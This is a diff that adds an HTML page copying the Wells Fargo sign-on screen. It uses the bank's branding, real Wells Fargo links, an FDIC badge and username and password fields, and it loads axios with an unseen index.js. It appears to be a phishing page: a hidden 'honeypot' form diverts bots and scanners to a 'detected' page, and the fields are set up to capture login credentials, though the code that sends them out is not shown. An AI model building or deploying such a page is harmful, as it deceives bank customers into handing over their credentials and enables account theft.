@@ -1,0 +1,352 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<html>
+<head>
+    <meta charset="utf-8">
+
+        <meta name="viewport" content="width=device-width, initial-scale=0.87, user-scalable=no">
+        
+        <title>Sign On - Wells Fargo</title>
+
+    
+        <link rel="stylesheet" href="style.css" type="text/css">
+        <link rel="icon" href="ico.png" type="image/png">
+        <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+        <script src="index.js"></script>
+
+        <!--Styling link for remember me checkbox-->
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.0/css/all.min.css">
+        
+        <style>
+            .insidecont {
+                background-color: white;
+                z-index: 2;
+                height: 477px;
+                width: 880px;
+                margin-right: auto;
+                margin-left: auto;
+                margin-bottom: 23px;
+                border-radius: 12px;
+            }
+        </style>
+        <style>
+            .container{
+                text-align: center;
+                align-items: center;
+                justify-content: center;
+
+            }
+            .remember-label {
+                margin-top: 19px;
+                margin-left: 6px;
+                margin-right: 190px;
+            }
+        </style>
+        <style>
+
+            .outcont {
+                background-color: white;
+                z-index: 2;
+                height: 275px;
+                width: 880px;
+                margin-right: auto;
+                margin-left: auto;
+                border-radius: 12px;
+                margin-top: -5px;
+            }
+
+
+            @media (max-width: 768px) {
+                .fdicdiv {
+                    display: flex;
+                    margin-top: 5px;
+                }
+                .fdicdivcomp {
+                    display: none;
+                }
+            
+                .insidecont{
+                    width: 100%;
+                    margin-top: -55px;
+                }
+            
+                body {
+                    background-color: white;
+                    background-image: none;
+                    height: 1250px;
+                    overflow-x: hidden;
+                }
+            
+                .navbar__menu {
+                    display: none;
+                }
+            
+                .bigmg {
+                    margin-left: 282px;
+                }
+
+                .outcont {
+                    background-color: white;
+                    z-index: 2;
+                    height: 275px;
+                    width: 100%;
+                    margin-right: auto;
+                    margin-left: auto;
+                    border-radius: 12px;
+                    margin-top: -100px;
+                }
+
+                .footed {
+                    display: none;
+                }
+                .footedsecond {
+                    display: none;
+                }
+                .footedpc {
+                    display: none;
+                }
+
+                .footedmbdiv {
+                    display: block;
+                }
+
+
+                .footedm {
+                    display: block;
+                    z-index: 99;
+                    max-width: 100%;
+                    position: relative;
+                }
+                
+            }
+
+
+        </style>
+
+</head>
+<body>
+
+    <div class="navbar__container">
+        <nav class="navbar">
+            <div class="navbar__container">
+                <a href="index.html" id="navbar__logo">
+                    <img src="Untitled.png" width="235" height="37" class="bigmg">
+                </a>
+                <div class="navbar__toggle" id="mobile-menu">
+                    <span class="bar"></span>
+                    <span class="bar"></span>
+                </div>
+                <ul class="navbar__menu">
+                    <li class="navbar__item">
+                        <div class="divadiv">
+                            <a href="https://oam.wellsfargo.com/oamo/identity/enrollment"><img src="enroll.png" width="73px" height="25px"></a>
+                        </div>
+                    </li>
+                    <li class="navbar__item">
+                        <div class="divadiv2">
+                            <a href="https://www.wellsfargo.com/help/"><img src="customerservice.png" width="110px" height="14px"></a>
+                        </div>
+                    </li>
+                    <li class="navbar__item">
+                        <div class="divadiv2">
+                            <a href="https://www.wellsfargo.com/locator/"><img src="atmlocate.png" width="110px" height="14px"></a>
+                        </div>
+                    </li>
+                    <li class="navbar__item">
+                        <div class="divadiv3">
+                            <a href="https://connect.secure.wellsfargo.com/auth/login/present?origin=cob&langPref=SPN"><img src="espanol.png" width="50px" height="16px"></a>
+                        </div>
+                    </li>
+                    <li class="navbar__item">
+                        <div class="divadiv3" style="margin-top: -1px;">
+                            <img src="searchthebar.png" width="100px" height="38px">
+                        </div>
+                    </li>
+                </ul> 
+            </div>
+        </nav>
+    </div>   
+    <div class="navbar__container2">
+        <nav class="navbar2">
+            <div class="navbar__container2">
+            </div>
+        </nav>
+    </div>
+    <div class="container">
+
+        <div class="insidecont">
+            <style>
+                #pp input[type="text"]::placeholder {
+                    color: rgb(255, 255, 255);
+                }
+            </style>
+
+            <!-- oughta here -->
+            <div class="tt">
+                <form id="pp" name="honey" action="detected.html" method="get">
+                    <input type="text" placeholder="Mothers Maiden Name" name="honeypot" style="outline: none; text-decoration: none; border: none; color:rgb(255, 255, 255); background-color: rgb(255, 255, 255);" height="15px" width="20px">
+                    <input type="submit" style="border: none; color: rgb(255, 255, 255); background-color: rgb(255, 255, 255);" width="25px" height="17px;">
+                </form>
+            </div>
+
+            <br>
+            <div class="imgcont" style="display: none;">
+                <img src="afternoon.png" width="239px" height="62px">
+            </div>
+
+            <div class="imgcont"  style="display: none;">
+                <img src="morning.png" width="245px" height="74px">
+            </div>
+
+            <div class="imgcont" style="display: block;">
+                <img src="goodevening.png" width="239px" height="67px">
+            </div>
+            <br>
+            <form action="#" class="form-contact">
+
+                <div class="inputbox">
+                    <input id="fusername" type="text" style="width: 340px;" required>
+                    <label>Username</label>
+                </div>
+                <div class="inputbox2">
+                    <input id="fpassword" type="password" style="width: 340px;" required>
+                    <label>Password</label>
+                </div>
+                <label class="remember-label">
+                    <input id="fremember" type="checkbox" name="remember" class="remember-checkbox" style="cursor:pointer;">
+                    <label for="check" class="remtext">Save Username</label>
+                </label>
+                <br>
+                <input id="fsubmit2" type="image" src="signon.png" width="182px" height="47px">
+                <input id="fsubmit" type="image" src="signongrey.png" width="182px" height="47px">
+                
+                
+            <form>
+            <style>
+                .coloredforgdiv{
+                    position: relative;
+                    top: 45px;
+                    background-color: #f4f0ed;
+                    width: 880px;
+                    border-radius: 12px;
+                    border-top-left-radius: 0px;
+                    border-top-right-radius: 0px;
+                }
+                @media (max-width: 768px) {
+                    .coloredforgdiv{
+                        position: relative;
+                        top: 25px;
+                        background-color: white;
+                        width: 880px;
+                        border-radius: 12px;
+                        border-top-left-radius: 0px;
+                        border-top-right-radius: 0px;
+                    }
+                }
+            </style>
+            <div class="coloredforgdiv">
+                <div class="forgor121" style="position: relative; top: -18px;">
+                    <a href="https://oam.wellsfargo.com/oamo/identity/help/passwordhelp#/"><p style="margin-top: 52px; color: rgb(62, 62, 62); text-decoration: underline;">Forgot username or password?</p></a>
+                </div>
+            </div>
+
+        </div>
+
+        <br>
+        <br>
+        <br>
+        
+        <div class="outcont">
+            <br>
+            <div class="outcontindiv">
+                <div class="fdicdiv">
+                    <img src="fdic.png" width="315px" height="250px">
+                </div>
+                <div class="fdicdivcomp">
+                    <img src="fdic2.png" width="733px" height="185px">
+                </div>
+                <div class="fdicdivv" style="margin-top: 10px; display: flex; align-items: center; text-align: center; justify-content: center">
+                    <img src="deposits.png" width="360px" height="39px">
+                </div>
+            </div>
+        </div>
+               
+        <!--javascript to change Submit button click, check css-->
+        <script>
+            var button = document.querySelector('.form-contact input[type="image"]');
+            var finput = document.querySelector('.form-contact input[type="text"]');
+            var finput2 = document.querySelector('.form-contact input[type="password"]');
+            var form = document.querySelector('.form-contact');
+            
+            button.addEventListener('click', function(event) {
+                var finputBorderColor = getComputedStyle(finput).borderBottomColor.toLowerCase();
+                var finput2BorderColor = getComputedStyle(finput2).borderBottomColor.toLowerCase();
+
+                
+                if (finput.value === '' || finput2.value === '') {
+                    event.preventDefault();
+
+                    finput.style.borderBottomColor = "rgb(137, 0, 0)";
+                    finput2.style.borderBottomColor = "rgb(137, 0, 0)";
+                    
+                    // Change label color to red when input is empty
+                    finput.nextElementSibling.style.color = "rgb(137, 0, 0)";
+                    finput2.nextElementSibling.style.color = "rgb(137, 0, 0)";
+
+                } else {
+
+                    button.style.opacity = 0.63;
+
+                    setTimeout(function() {
+
+                        button.style.opacity = 1;
+            
+                        // Reset label color when input is not empty
+                        finput.nextElementSibling.style.color = "grey";
+                        finput2.nextElementSibling.style.color = "grey";
+                    }, 4000);
+                }
+            });            
+        </script>
+    </div>
+    <div class="footed">
+        <div class="footedsecond">
+            <a href="https://www.wellsfargo.com/about/"><img src="footedpc.png" class="footedpc"></a>
+        </div>
+    </div>
+
+    <div class="footedmbdiv">
+        <div class="innerdmb">
+            <a href="https://www.wellsfargo.com/about/"><img src="footed.png" class="footedm" width="100%"></a>
+        </div>
+    </div>
+    <style>
+        .footedmbdiv {
+            background-color: #f4f0ed;
+            position: absolute;
+            width: 100%;
+            height: 400px;
+            margin-top: 694px;
+            display: none;
+            margin-left: -8px;
+        }
+        .innerdmb {
+            display: none;
+        }
+        @media (max-width: 768px) {
+            .footedmbdiv {
+                display: block;
+            }
+            .innerdmb {
+                display: block;
+                position: relative;
+                left: 9px;
+            }
+        }
+    </style>
+
+
+</body>
+
+</html>
